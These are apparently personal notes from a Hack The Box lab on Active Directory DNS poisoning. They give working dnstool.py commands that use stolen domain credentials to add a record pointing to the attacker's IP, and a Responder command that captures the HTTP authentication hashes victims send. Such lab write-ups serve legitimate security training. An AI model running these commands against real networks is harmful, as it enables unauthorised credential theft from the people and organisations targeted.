If the victim is trying to authenticate to a service (such as HTTP) then you can poison their DNS by adding a record pointing to you and intercept the hash
- good example on HTB intelligence
  
add a DNS record
- python3 /home/kali/Documents/htb/manager/krbrelayx/dnstool.py -u '<domain>\<user>' -p '<pass>' -a add -r '<name_of_record>' -d '<attacker_ip>' <victim_ip>
    
    - name of record is subject to change, for example, on intelligence they had a powershell script that is looking for all web servers to check if they are down, and it searches for any web server that has a name like “web*”
        
        - in our case, we made the record name web01
        
    
![image 253.png](../assets/DNS%20Poisoning/image%20253.png)
  
check if the DNS record was successfully added
- python3 /home/kali/Documents/htb/manager/krbrelayx/dnstool.py -u '<domain>\<user> -p '<pass>' -a query --record '<name_of_record>' -d '<attacker_ip>' <victim_ip>
![image 1 183.png](../assets/DNS%20Poisoning/image%201%20183.png)
  
if the DNS record is successfully set up, now you can set up responder to capture the hash
- make sure the HTTP server is set to ON in Responder.conf
- sudo responder -I tun0 -dP
![image 2 157.png](../assets/DNS%20Poisoning/image%202%20157.png)
  
when the query is made to the HTTP server, it should capture the hash
![image 3 138.png](../assets/DNS%20Poisoning/image%203%20138.png)